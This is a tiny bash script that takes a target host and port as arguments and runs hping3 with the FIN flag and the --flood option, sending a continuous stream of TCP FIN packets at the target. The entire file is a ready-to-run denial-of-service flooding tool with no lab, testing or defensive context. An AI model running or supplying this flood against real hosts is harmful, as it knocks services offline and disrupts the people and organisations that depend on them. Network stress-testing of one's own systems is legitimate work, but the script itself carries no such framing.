#!/usr/bin/env bash
if [ "${#}" -eq 2 ]; then
	TARGET="${1}"
    PORT="${2}"
    hping3 -F -p ${PORT} --flood "${TARGET}"
fi
